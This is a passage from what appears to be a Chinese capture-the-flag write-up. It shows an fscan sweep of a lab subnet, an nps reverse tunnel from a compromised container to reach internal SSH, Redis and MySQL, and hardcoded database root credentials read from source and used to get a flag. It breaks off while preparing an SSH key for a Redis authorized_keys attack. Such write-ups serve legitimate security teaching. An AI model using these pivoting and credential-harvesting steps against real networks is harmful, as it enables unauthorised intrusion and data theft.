&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@66ff0435ac92:&#x2F;app# &#x2F;app&#x2F;tools&#x2F;fscan -h 172.20.0.4&#x2F;16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;app&#x2F;tools&#x2F;fscan -h 172.20.0.4&#x2F;16
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start infoscan
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.20.0.1      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.20.0.2      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.20.0.3      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(icmp) Target 172.20.0.4      is alive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] LiveTop 172.20.0.0&#x2F;16    段存活数量为: 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] LiveTop 172.20.0.0&#x2F;24    段存活数量为: 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] Icmp alive hosts len is: 4
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:80 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.2:22 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:22 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:21 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:443 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.4:8080 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:8080 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.2:6379 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.3:3306 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:3306 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:888 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:7777 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;172.20.0.1:10001 open
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] alive ports len is: 13
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start vulscan
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Redis:172.20.0.2:6379 unauthorized file:&#x2F;data&#x2F;dump.rdb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[+] Redis:172.20.0.2:6379 like can write &#x2F;root&#x2F;.ssh&#x2F;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.1         code:200 len:138    title:404 Not Found
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.1:8080    code:302 len:35     title:None 跳转url: http:&#x2F;&#x2F;172.20.0.1:8080&#x2F;login&#x2F;index
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.1:888     code:403 len:548    title:403 Forbidden
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.1:8080&#x2F;login&#x2F;index code:200 len:3617   title:None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.1:7777    code:200 len:917    title:恭喜，站点创建成功！
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.4:8080    code:302 len:199    title:Redirecting... 跳转url: http:&#x2F;&#x2F;172.20.0.4:8080&#x2F;login
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;[*] WebTitle: http:&#x2F;&#x2F;172.20.0.4:8080&#x2F;login code:200 len:1145   title:LOGIN
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;已完成 12&#x2F;13 [-] ssh 172.20.0.1:22 root root#123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;按照题目描述的提示去掉 &lt;code&gt;.1&lt;&#x2F;code&gt; 结尾的 IP 可以得到压缩包的密码如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;8080
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;22-3306-6379-8080
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过尝试发现下面那个是 &lt;code&gt;hint.zip&lt;&#x2F;code&gt; 的密码，解压后打开（丢 Linux 里面打开）来可以得到 Hint 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;可以看到，在本内网下还有另外两台服务器
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;其中一台开启了22(ssh)和6379(redis)端口
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;另一台开启了3306(mysql)端口
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;还有一台正是你访问到的留言板服务
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;此处可了解`nps`和`frp`，同样在&#x2F;app&#x2F;tools已内置了相应文件
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;连接代理，推荐`proxychains`
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x04-huo-qu-flag2&quot;&gt;0x04 获取 flag2&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x04-huo-qu-flag2&quot; aria-label=&quot;Anchor link for: 0x04-huo-qu-flag2&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;p&gt;提示中已经讲明了在 &lt;code&gt;&#x2F;app&#x2F;tools&lt;&#x2F;code&gt; 有 &lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&quot;&gt;nps&lt;&#x2F;a&gt; ，那就继续用 nps 吧。这里的 nps 是客户端，我们需要在我们的服务端（在自己搭建的 nps 所在的服务器）的 &lt;code&gt;客户端&lt;&#x2F;code&gt; 中新增一个供靶机进行内网渗透用，在获取到的靶机 Shell 中进行连接&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@05551bd5dd95:&#x2F;app&#x2F;tools# .&#x2F;npc -server=&amp;lt;nsp服务端 IP&amp;gt;:8024 -vkey=&amp;lt;Unique verify Key&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;npc -server=&amp;lt;nsp服务端 IP&amp;gt;:8024 -vkey=&amp;lt;Unique verify Key&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;连接成功后在 &lt;code&gt;客户端&lt;&#x2F;code&gt; 找到靶机所连接的 客户端 ID ，点击隧道，新增 &lt;strong&gt;TCP&lt;&#x2F;strong&gt; 隧道，服务器端口根据自行进行调节，我的设置如下&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;ssh&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;服务端端口 - 2222
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;目标 (IP:端口) - 172.20.0.2:22
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;redis&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;服务端端口 - 6379
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;目标 (IP:端口) - 172.20.0.2:6379
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;mysql&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;服务端端口 - 3309
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;目标 (IP:端口) - 172.20.0.3:3306
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;设置完后，通过打印 &lt;code&gt;&#x2F;app&lt;&#x2F;code&gt; 路径的文件及目录可以发现以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@05551bd5dd95:&#x2F;app# ls
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ls
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;__pycache__
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;app.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dataSql.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;getPIN.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;static
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;tools
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 cat 可以获取 &lt;code&gt;dataSql.py&lt;&#x2F;code&gt; 的内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root@05551bd5dd95:&#x2F;app# cat dataSql.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cat dataSql.py
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import pymysql
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import time
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import getPIN
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;pin = getPIN.get_pin()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Database:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def __init__(self, max_retries=3):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.max_retries = max_retries
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.db = None
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def __enter__(self):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        self.db = self.connect_to_database()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return self.db, self.db.cursor()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def __exit__(self, exc_type, exc_val, exc_tb):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if self.db and self.db.open:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            self.db.close()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    def connect_to_database(self):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        retries = 0
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while retries &amp;lt; self.max_retries:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                db = pymysql.connect(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    host=&amp;quot;mysql&amp;quot;,  # 数据库地址
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    port=3306,  # 数据库端口
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    user=&amp;quot;root&amp;quot;,  # 数据库用户名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    passwd=&amp;quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&amp;quot;,  # 数据库密码
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    database=&amp;quot;messageboard&amp;quot;,  # 数据库名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    charset=&amp;#39;utf8&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                )
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return db
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            except pymysql.Error as e:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                retries += 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                print(f&amp;quot;Connection attempt {retries} failed. Retrying in 5 seconds...&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                time.sleep(5)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        raise Exception(&amp;quot;Failed to connect to the database after maximum retries.&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def canLogin(username,password):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select password from users where username=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql, username)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if res:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if res[0][0] == password:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return True
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return False
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def register(id,username,password,power):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select username from users where username=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql, username)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if res:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return False
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            sql = &amp;#39;insert into users (id,username,password,power) values (%s,%s,%s,%s)&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            cursor.execute(sql, (id,username,password,power))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            db.commit()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return True
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def changePassword(username,oldPassword,newPassword):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select password from users where username=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql, username)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if res:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if oldPassword == res[0][0]:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                sql = &amp;#39;update users set password=%s where username=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                cursor.execute(sql, (newPassword,username))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                db.commit()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return True
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                return &amp;quot;wrong password&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return &amp;quot;username doesn&amp;#39;t exist.&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def uploadMessage(username,message,nowtime,private):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;insert into message (username,data,time,private) values (%s,%s,%s,%s)&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql, (username,message,nowtime,private))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        db.commit()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return True
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def showMessage():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select * from message&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = [tuple([str(elem).replace(&amp;#39;128-243-397&amp;#39;, pin) for elem in i]) for i in res]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return res
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def usersName():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select * from users&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return len(res)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getPower(username):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;select power from users where username=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql, username)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        res = cursor.fetchall()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return res[0][0]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def deleteMessage(username,pubTime):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    with Database() as (db, cursor):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        sql = &amp;#39;delete from message where username=%s and time=%s&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        cursor.execute(sql,(username,pubTime))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        db.commit()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return True
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;查看源码可以得到以下内容&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;账号 - root&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;密码 - The_P0sswOrD_Y0u_Nev3r_Kn0w&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;数据库名 - messageboard&lt;&#x2F;p&gt;
&lt;p&gt;通过我们搭建的内网渗透访问 &lt;code&gt;&amp;lt;nsp服务端 IP&amp;gt;:3309&lt;&#x2F;code&gt; 用以上获得的账号密码登录就能进入 MySQL，可以发现 &lt;code&gt;messageboard&lt;&#x2F;code&gt; 库中存在表名 &lt;code&gt;flag&lt;&#x2F;code&gt; ，&lt;code&gt;flag&lt;&#x2F;code&gt; 表存在字段 &lt;code&gt;flag&lt;&#x2F;code&gt; ，内容如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-Are-YOu-myS0L-MasT3r?-
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h4 id=&quot;0x05-huo-qu-flag3&quot;&gt;0x05 获取 flag3&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x05-huo-qu-flag3&quot; aria-label=&quot;Anchor link for: 0x05-huo-qu-flag3&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;network-services-pentesting&#x2F;6379-pentesting-redis#redis-rce&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;由于上面已经完成了映射，通过访问 &lt;code&gt;&amp;lt;nsp服务端 IP&amp;gt;:6379&lt;&#x2F;code&gt; 即可。先通过 &lt;code&gt;ssh-keygen&lt;&#x2F;code&gt; 生成一个密钥作为 SSH 登录凭证，如下所示&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ ssh-keygen -t rsa
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Generating public&#x2F;private rsa key pair.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter file in which to save the key (&#x2F;home&#x2F;kali&#x2F;.ssh&#x2F;id_rsa): 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter passphrase (empty for no passphrase): 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Enter same passphrase again: 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Your identification has been saved in &#x2F;home&#x2F;kali&#x2F;.ssh&#x2F;id_rsa
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Your public key has been saved in &#x2F;home&#x2F;kali&#x2F;.ssh&#x2F;id_rsa.pub
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;The key fingerprint is:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;SHA256:X8dvPV1NJ0H8CDFyeFDBvsAHPtmiQjf5UY91+r0hTHY kali@kali
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;The key&amp;#39;s randomart image is:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;+---[RSA 3072]----+
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;|          o=*=o  |
